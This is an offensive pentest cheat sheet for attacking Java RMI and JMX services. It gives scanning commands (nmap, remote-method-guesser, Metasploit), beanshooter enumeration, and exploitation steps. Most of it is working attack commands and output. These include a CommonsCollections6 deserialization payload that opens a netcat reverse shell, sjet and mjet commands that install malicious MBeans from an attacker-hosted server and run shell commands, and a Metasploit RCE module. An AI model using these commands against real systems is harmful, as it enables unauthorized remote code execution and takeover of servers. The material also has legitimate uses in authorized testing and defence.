entries.title: What Java RMI is and where to look
entries.body:
Java RMI (Remote Method Invocation) is a Java API that lets an object in one JVM invoke methods of an object in another JVM, including on a remote machine. It is the distributed computing mechanism in Java.
• If an RMI service is configured carelessly, it is vulnerable to various remote code execution (RCE) methods.
• A common scenario: host an MLet file and make a JMX service load MBeans from a remote server (the mjet/sjet tools).
• Look for open RMI ports: RMI registry, DGC, Activator; JMX over RMI (jmxrmi).
• Standard ports vary (1090, 1089, 9010, etc.) - scan the whole range, registry bindings are non-standard.

entries.title: Tools for RMI/JMX
entries.body:
siberas/sjet — siberas JMX exploitation toolkit (https://github.com/siberas/sjet)
mogwailabs/mjet — MOGWAI LABS JMX exploitation toolkit (https://github.com/mogwailabs/mjet)
qtc-de/remote-method-guesser (rmg) — Java RMI Vulnerability Scanner (https://github.com/qtc-de/remote-method-guesser)
qtc-de/beanshooter — JMX enumeration and attacking tool (https://github.com/qtc-de/beanshooter)

entries.title: Detection via nmap (rmi-dumpregistry / rmi-vuln-classloader)
entries.body:
$ nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p TARGET_PORT TARGET_IP -Pn -v
1089/tcp open  java-rmi Java RMI
| rmi-vuln-classloader:
|   VULNERABLE:
|   RMI registry default configuration remote code execution vulnerability
|     State: VULNERABLE
|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
| rmi-dumpregistry:
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub

entries.title: Port scanning via remote-method-guesser (rmg scan)
entries.body:
$ rmg scan 172.17.0.2 --ports 0-65535
[+] Scanning 6225 Ports on 172.17.0.2 for RMI services.
[+]  [HIT] Found RMI service(s) on 172.17.0.2:40393 (DGC)
[+]  [HIT] Found RMI service(s) on 172.17.0.2:1090  (Registry, DGC)
[+]  [HIT] Found RMI service(s) on 172.17.0.2:9010  (Registry, Activator, DGC)
[+]  [6234 / 6234] [#############################] 100%
[+] Portscan finished.

entries.title: Scan via Metasploit (java_rmi_server scanner)
entries.body:
use auxiliary/scanner/misc/java_rmi_server
set RHOSTS <IPs>
set RPORT <PORT>
run

entries.title: beanshooter - enumerating JMX and MBeans
entries.body:
# List of available attributes
beanshooter info 172.17.0.2 9010

# Show an attribute value
beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose

# Set an attribute value
beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose true --type boolean

# List of registered MBeans
beanshooter list 172.17.0.2 9010

# Enumerate a JMX endpoint
beanshooter enum 172.17.0.2 1090

entries.title: beanshooter - deploying an MBean
entries.body: beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example --jar-file exampleBean.jar --stager-url http://172.17.0.1:8000

entries.title: beanshooter - invoking a method on a JMX endpoint
beanshooter - invoking arbitrary public/static Java methods
entries.body:
beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'

entries.title: beanshooter - deserialization attack on JMX
entries.body: beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --username admin --password admin

entries.title: Requirements for the sjet/mjet attack
entries.body:
• Jython
• The JMX server can connect to an HTTP service controlled by the attacker
• JMX authentication is not enabled

entries.title: How the MLet attack works (steps)
entries.body:
1. Stand up a web server serving an MLet file and a JAR with malicious MBeans.
2. Create on the target server, via JMX, an instance of the MBean javax.management.loading.MLet.
3. Invoke the getMBeansFromURL method of this MBean, passing the web server's URL. The JMX service will connect to the HTTP server and parse the MLet file.
4. The JMX service downloads and loads the JARs specified in the MLet file, making the malicious MBean available via JMX.
5. The attacker invokes the methods of the malicious MBean.

entries.title: Exploitation via sjet / mjet
entries.body:
jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000
jython sjet.py TARGET_IP TARGET_PORT super_secret command "ls -la"
jython sjet.py TARGET_IP TARGET_PORT super_secret shell
jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password
jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall
jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 "touch /tmp/xxx"

jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000
jython mjet.py TARGET_IP TARGET_PORT command super_secret "whoami"
jython mjet.py TARGET_IP TARGET_PORT command super_secret shell

entries.title: Metasploit - java_rmi_server exploit
entries.body:
use exploit/multi/misc/java_rmi_server
set RHOSTS <IPs>
set RPORT <PORT>
# configure also the payload if needed
run
